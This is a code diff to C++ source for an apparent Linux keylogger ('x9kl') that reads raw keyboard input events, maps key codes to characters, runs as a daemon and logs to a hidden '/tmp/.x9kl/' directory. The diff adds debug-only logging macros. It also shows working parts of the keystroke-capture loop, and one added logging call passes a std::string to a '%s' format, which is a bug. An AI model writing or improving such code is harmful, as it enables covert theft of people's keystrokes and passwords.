@@ -9,7 +9,9 @@
 #include <cstring>
 #include <ctime>
 #include <fstream>
+#ifdef DEBUG
 #include <iostream>
+#endif  // DEBUG
 #include <map>
 #include <regex>
 #include <stdexcept>
@@ -17,6 +19,14 @@
 #include <vector>
 
 #define LOGS_DIRECTORY "/tmp/.x9kl/"
+
+#ifdef DEBUG
+#define X9_LOG(...)   std::fprintf(stdout, __VA_ARGS__)
+#define X9_ERROR(...) std::fprintf(stderr, __VA_ARGS__)
+#else
+#define X9_LOG(...)
+#define X9_ERROR(...)
+#endif  // DEBUG
 
 struct x9kl_ctx_t {
   bool is_capslock_on;
@@ -43,7 +53,7 @@ static void handle_shift(x9kl_ctx_t *);
 
 volatile std::sig_atomic_t must_stop{0};
 
-/* key mapping */
+// key mapping
 static const std::map<int, key_event_handler_t> handlers{
     {KEY_0, {'0', ')', handle_key}},
     {KEY_1, {'1', '!', handle_key}},
@@ -114,6 +124,7 @@ static std::vector<std::string> get_event_files(void) {
       std::smatch match;
 
       if (std::regex_search(line, match, kb_regex)) {
+        X9_LOG("keyboard found, event file: '%s'\n", match[1].str());
         content.emplace_back(match[1]);
       }
     }
@@ -148,6 +159,7 @@ static int initialize_ctx(x9kl_ctx_t *ctx) {
   ctx->kb_fds = get_keyboard_fds();
 
   if (ctx->kb_fds.empty()) {
+    X9_ERROR("no keyboards found\n");
     return 1;
   }
 
@@ -272,20 +284,22 @@ void run(x9kl_ctx_t *ctx) {
         int n_bytes = read(fd, &ev, sizeof(struct input_event));
 
         if ((ev.type == EV_KEY) && (n_bytes > 0)) {
+          X9_LOG("event received for key '%d'\n", ev.code);
+
           try {
             auto ev_handler = handlers.at(ev.code);
 
             ctx->event = ev;
             ev_handler.cb(ctx);
           } catch (const std::out_of_range &e) {
-#ifdef DEBUG
-            std::cerr << "no event handler for key " << ev.code << std::endl;
-#endif  // DEBUG
+            X9_ERROR("no event handler for key %d\n", ev.code);
           }
         }
       }
     }
   }
+
+  X9_LOG("finishing daemon\n");
 }
 
 int main(void) {
@@ -294,7 +308,13 @@ int main(void) {
 #endif  // DEBUG
     x9kl_ctx_t ctx;
 
+#ifdef DEBUG
+    std::setvbuf(stdout, nullptr, _IONBF, 0);
+    std::setvbuf(stderr, nullptr, _IONBF, 0);
+#endif  // DEBUG
+
     if (initialize_ctx(&ctx)) {
+      X9_ERROR("fail to initialize the context\n");
       std::exit(EXIT_FAILURE);
     }
 
